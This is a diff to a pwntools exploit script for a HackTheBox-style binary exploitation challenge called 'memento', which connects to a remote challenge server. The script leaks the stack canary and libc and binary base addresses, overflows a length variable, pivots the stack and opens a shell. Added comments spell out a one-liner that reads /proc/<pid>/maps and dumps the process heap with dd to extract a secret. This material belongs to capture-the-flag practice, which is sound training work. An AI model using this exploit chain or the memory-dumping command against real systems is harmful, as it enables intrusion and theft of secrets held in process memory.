@@ -4,7 +4,6 @@ from pwn import *
 
 exe = ELF("./memento_patched")
 libc = ELF("./libc_chall.so", checksec = False)
-# libc = exe.libc
 
 context.binary = exe
 
@@ -17,7 +16,7 @@ def conn():
         if args.GDB:
             gdb.attach(r, "break reset\nbreak *remember+157")
     else:
-        r = remote("94.237.58.137", 39003)
+        r = remote("94.237.53.219", 32753)
 
     return r
 
@@ -37,13 +36,12 @@ def reset():
     r.send(b"C")
 
 
-# NOTE: I didn't manage to submit the flag since I don't know where's located
-#       but I got the shell, so for now it's fine as is
+# NOTE: The flag in remote is piped-in at the launch, so it resides in memory!
 def main():
     r = conn()
 
     # Get in the loop
-    r.sendline(b"HTB{}")
+    r.sendline(b"HTB{f4k3_fl4g}")
 
     # Overflow the length variable saved in the stack
     remember(24, b"A" * 24)
@@ -55,7 +53,7 @@ def main():
 
     buffer = u64(leak[32:40]) - 0x19
     canary = u64(leak[40:48])
-    libc.address = u64(leak[56:64]) - (libc.sym.__libc_start_call_main + 122)   # - 0x2a1ca
+    libc.address = u64(leak[56:64]) - (libc.sym.__libc_start_call_main + 122)
     exe.address = u64(leak[88:96]) - exe.sym.main
 
     log.info(f"buffer: 0x{buffer:x}")
@@ -95,6 +93,20 @@ def main():
     remember(24, b"A" * 24)
     remember(17, p64(0x0) + p8((buffer - 0x48 - 0x1) & 0xFF) + p64(leave))
 
+    # Since the flag is in memory, we could either take the route to leak it inside the binary
+    # or we can run this serie of command to read it once we got the shell!
+    # Considering that the process has pid=12, the chain of commands is:
+    # cat /proc/12/maps | grep "heap" | awk -F'[- ]' '{system("dd if=/proc/12/mem bs=1 skip=$((0x"$1")) count=1024 2>/dev/null")}' | grep -a -oP "HTB\{.{1,50}\}"
+    #
+    # cat /proc/12/maps     --->    prints the memory mappings of the process, in this case the challenge.
+    # grep "heap"           --->    gets the entries that contain "heap" (so just one in our case).
+    # awk ... {system...}   --->    awk splits the line using either a dash or a space as a delimiter, and turns the range memory range into two variables $1 and $2.
+    #                               system(...) tells awk to execute a shell command for every single line (memory segment) it finds in the map.
+    # dd ...                --->    dumps the memory of FILE in `if` with block_size=1 (byte). It then "skips" (jump) to the heap saved in $1 and reads 1024 bytes.
+    # grep ...              --->    it find exact matches of entries for a given RegExp (using Perl syntax) and treats binary data as text (would otherwise give up on it).
+    r.interactive("$ ")
+
+
     ''' NOTE: The function currently being executed is `remember()`
 
     pwndbg> stack 0x18
@@ -119,8 +131,6 @@ def main():
     13:0098│     0x7fff3edb9d28 —▸ 0x7c0f5822a1ca (__libc_start_call_main+122) ◂— mov edi, eax
     14:00a0│     0x7fff3edb9d30 —▸ 0x7fff3edb9d70 —▸ 0x5a3a75fcfd70 —▸ 0x5a3a75fcd150 ◂— endbr64
     '''
-
-    r.interactive("$ ")
 
 
 if __name__ == "__main__":
